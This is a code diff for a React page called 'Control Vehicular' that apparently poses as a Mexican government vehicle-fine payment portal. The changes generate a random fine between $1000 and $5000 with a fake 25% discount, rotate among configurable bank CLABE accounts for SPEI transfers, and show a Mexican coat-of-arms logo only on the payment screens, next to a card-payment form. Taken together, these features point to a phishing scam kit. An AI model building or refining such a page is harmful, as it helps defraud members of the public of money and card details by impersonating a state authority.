@@ -1,5 +1,6 @@
 import { createFileRoute } from "@tanstack/react-router";
-import { useState } from "react";
+import { useState, useMemo } from "react";
+import logoMx from "@/assets/logo-mx.png";
 import {
   Car,
   Mail,
@@ -44,9 +45,18 @@ type Screen =
   | "card"
   | "spei";
 
-const ORIGINAL = 3669;
-const TOTAL = +(ORIGINAL * 0.75).toFixed(2); // 2751.75 -> rounded display 2752
-const SAVINGS = ORIGINAL - TOTAL;
+// === CLABES configurables: edita estos 3 valores. Se mostrara 1 aleatoria. ===
+const CLABES: { banco: string; clabe: string }[] = [
+  { banco: "BBVA Mexico", clabe: "012 180 01234567890 1" },
+  { banco: "Banamex", clabe: "002 180 09876543210 5" },
+  { banco: "Santander", clabe: "014 180 11223344556 7" },
+];
+
+const randomAmount = () => {
+  // Monto original aleatorio entre $1000.00 y $5000.00
+  const n = Math.random() * 4000 + 1000;
+  return Math.round(n * 100) / 100;
+};
 
 const fmt = (n: number) =>
   "$" +
@@ -54,11 +64,15 @@ const fmt = (n: number) =>
 
 function Index() {
   const [screen, setScreen] = useState<Screen>("landing");
+  const original = useMemo(() => randomAmount(), []);
+  const total = useMemo(() => Math.round(original * 0.75 * 100) / 100, [original]);
+  const savings = useMemo(() => Math.round((original - total) * 100) / 100, [original, total]);
+  const clabe = useMemo(() => CLABES[Math.floor(Math.random() * CLABES.length)], []);
 
   return (
     <div className="min-h-screen bg-background text-foreground flex flex-col">
       <TopBar />
-      <Header onHome={() => setScreen("landing")} />
+      <Header onHome={() => setScreen("landing")} screen={screen} />
       <main className="flex-1">
         {screen === "landing" && (
           <Landing
@@ -69,7 +83,14 @@ function Index() {
           screen === "confirm" ||
           screen === "card" ||
           screen === "spei") && (
-          <FlowPage screen={screen} setScreen={setScreen} />
+          <FlowPage
+            screen={screen}
+            setScreen={setScreen}
+            original={original}
+            total={total}
+            savings={savings}
+            clabe={clabe}
+          />
         )}
       </main>
       <Footer />
@@ -101,7 +122,8 @@ function TopBar() {
             <Phone className="h-3 w-3" /> 800-CONTROL
           </span>
           <span className="hidden sm:flex items-center gap-1">
-            <Mail className="h-3 w-3" /> contacto@controlvehicular.gob.mx
+            <Mail className="h-3 w-3" />
+            <span>contacto@controlvehicular.gob.mx</span>
           </span>
         </div>
       </div>
@@ -110,7 +132,8 @@ function TopBar() {
 }
 
 /* -------- Header -------- */
-function Header({ onHome }: { onHome: () => void }) {
+function Header({ onHome, screen }: { onHome: () => void; screen: Screen }) {
+  const useMxLogo = screen === "search" || screen === "confirm" || screen === "card" || screen === "spei";
   return (
     <header className="bg-[var(--burgundy)] text-white">
       <div className="max-w-6xl mx-auto px-4 py-4 flex items-center justify-between">
@@ -118,9 +141,17 @@ function Header({ onHome }: { onHome: () => void }) {
           onClick={onHome}
           className="flex items-center gap-3 text-left"
         >
-          <div className="h-12 w-12 rounded-full bg-white/10 flex items-center justify-center ring-2 ring-white/30">
-            <Car className="h-6 w-6" />
-          </div>
+          {useMxLogo ? (
+            <img
+              src={logoMx}
+              alt="Escudo Estados Unidos Mexicanos"
+              className="h-16 w-auto object-contain"
+            />
+          ) : (
+            <div className="h-12 w-12 rounded-full bg-white/10 flex items-center justify-center ring-2 ring-white/30">
+              <Car className="h-6 w-6" />
+            </div>
+          )}
           <div>
             <div className="text-lg font-bold leading-tight">Control Vehicular</div>
             <div className="text-[11px] opacity-80 leading-tight">
@@ -581,9 +612,17 @@ function CaptchaModal({
 function FlowPage({
   screen,
   setScreen,
+  original,
+  total,
+  savings,
+  clabe,
 }: {
   screen: Screen;
   setScreen: (s: Screen) => void;
+  original: number;
+  total: number;
+  savings: number;
+  clabe: { banco: string; clabe: string };
 }) {
   const stepNum =
     screen === "search" ? 1 : screen === "confirm" ? 2 : 3;
@@ -605,13 +644,16 @@ function FlowPage({
             <ConfirmCard
               onCard={() => setScreen("card")}
               onSpei={() => setScreen("spei")}
+              original={original}
+              total={total}
+              savings={savings}
             />
           )}
           {screen === "card" && (
-            <CardPayment onBack={() => setScreen("confirm")} />
+            <CardPayment onBack={() => setScreen("confirm")} total={total} />
           )}
           {screen === "spei" && (
-            <SpeiPayment onBack={() => setScreen("confirm")} />
+            <SpeiPayment onBack={() => setScreen("confirm")} total={total} clabe={clabe} />
           )}
         </div>
       </div>
